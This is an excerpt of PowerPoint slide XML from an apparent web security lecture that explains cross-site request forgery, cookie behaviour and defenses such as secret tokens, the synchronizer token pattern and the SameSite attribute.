                  <a:pt x="0" y="112833"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3370224" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3404926" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3433265" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3452372" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3459378" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3459378" y="112833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3452372" y="147536"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3433265" y="175876"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3404926" y="194983"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3370224" y="201989"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="201989"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="194983"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="175876"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="147536"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="112833"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="340584314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39228" y="67235"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="327217" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>Defense: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-4" dirty="0"/>
              <a:t>Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-31" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>token</a:t>
            </a:r>
            <a:endParaRPr sz="5383" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2622176" y="1966632"/>
            <a:ext cx="7642412" cy="1738296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="414619" indent="-403433">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2824" b="1" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Include a secret token in every link/form</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="815250" lvl="1" indent="-403433">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2118" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Can use a hidden form field, custom HTTP header, or encode it directly in the URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="815250" lvl="1" indent="-403433">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2118" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Must not be guessable value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="815250" lvl="1" indent="-403433">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2118" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Can be same  as session ID sent in cookie</a:t>
            </a:r>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2178144" y="4437530"/>
            <a:ext cx="7347396" cy="1613262"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="414619" indent="-403433">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2471" b="1" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Framework helps: Ruby on Rails embeds</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2471" b="1" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>     secret in every link automatically</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2471" b="1" spc="4" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2471" u="sng" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>http://website.com/doStuff.html?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2471" u="sng" spc="4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>sid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2471" u="sng" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>=81asdf97er8ef</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="95973472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39228" y="67235"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="327217" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>Defense: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-4" dirty="0"/>
              <a:t>Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-31" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>token</a:t>
            </a:r>
            <a:endParaRPr sz="5383" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3709148" y="909078"/>
            <a:ext cx="4751109" cy="581249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3177" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F497D">
                    <a:lumMod val="75000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Synchronizer token pattern</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="97284" name="Picture 4"/>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620147" y="1392899"/>
            <a:ext cx="8580904" cy="50566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BBCF1D37-7A70-E6CC-7CAA-0E7CEDD1BB44}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582930" y="6421433"/>
            <a:ext cx="10957559" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Ref:  https://faun.pub/cross-site-request-forgery-protection-using-synchronizer-token-pattern-72b246ded56c</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="228081183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39228" y="67235"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="327217" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>Defense: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-4" dirty="0"/>
              <a:t>Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-31" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>token</a:t>
            </a:r>
            <a:endParaRPr sz="5383" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3709148" y="909078"/>
            <a:ext cx="4751109" cy="581249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3177" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1F497D">
                    <a:lumMod val="75000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Synchronizer token pattern</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="99332" name="Picture 3"/>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472282" y="1427238"/>
            <a:ext cx="8708262" cy="51324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2243132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B1B44C-96A2-CC9C-7CD9-5BD25C2B40DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Introduction to Web Cookies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5783A444-3E72-8B24-0FC9-7163BB52522F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="759582" y="1669143"/>
            <a:ext cx="10135480" cy="4765343"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Because HTTP is a stateless protocol, it cannot internally distinguish one user from another. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>To address this issue, cookie technology was invented in 1994. By using cookies, servers instruct browsers to save a unique key and then send it back with each request made to the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>When a request is sent from a browser to a website, the browser checks if it has a stored cookie that belongs to that website. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>While carrying out this process, it checks to see whether the properties and flags of the cookies (domain, path, secure), match the website’s data which has been requested. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>If they match, the browser sends the relevant cookies along with the request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="198182607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5E2FCE-9762-F765-3BB7-6F9EF3929BC5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="1357936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Cookies Misuse Can Lead to Cross-site Request Forgery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6110D292-0672-66F1-9E20-F58D3DCC7244}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291605"/>
            <a:ext cx="9598121" cy="3592330"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>This behavior is also repeated in the same way for requests made by third parties through the browser. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>By “third parties” we mean other websites that we don’t visit directly. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>The critical point from a web application security perspective is that when you visit website A, all cookies kept in the browser for site B will be added to the request initiated toward site B by site A. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>So, a session that belongs to B on the browser can be used and even abused in this way.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="403001118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56F72F-B349-CFDA-0C72-62A982DF5822}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="872288" y="189825"/>
            <a:ext cx="10321636" cy="1357936"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Cookies Misuse Can Lead to Cross-site Request Forgery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BF75383-A3B2-17C2-91D8-3AEAC1FF7D7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="391885" y="1614271"/>
            <a:ext cx="11045372" cy="5205207"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>browsers is known as Cross-site Request Forgery (CSRF).  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>It is carried out by misusing a session belonging to an authorized user by using this browser behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>This browser behavior can also be misused for other purposes like tracking users or advertising. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>When you enter a site, for instance example.com, your browser may make a few requests to different sites because of the HTML elements placed on the page of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>, for example Facebook Like buttons, Google Analytics code, etc. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Along with these requests, the cookies in the browser that belong to these other sites will also be sent. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="101820"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Circular XX"/>
              </a:rPr>
              <a:t>Therefore those third parties can track and log your activity by using Cookie and Referrer information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="372273169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Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2129118" y="336176"/>
            <a:ext cx="8194301" cy="380232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Same-Site Cookie Attribute to Prevent CSRF Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="108547" name="Picture 2" descr="This block diagram explains how cross-site cookie requests work"/>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65943" y="1027383"/>
            <a:ext cx="9448351" cy="51188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7057179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39228" y="717176"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1591322" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="-287" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="13" dirty="0"/>
              <a:t>vs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5383" spc="13" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-207" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
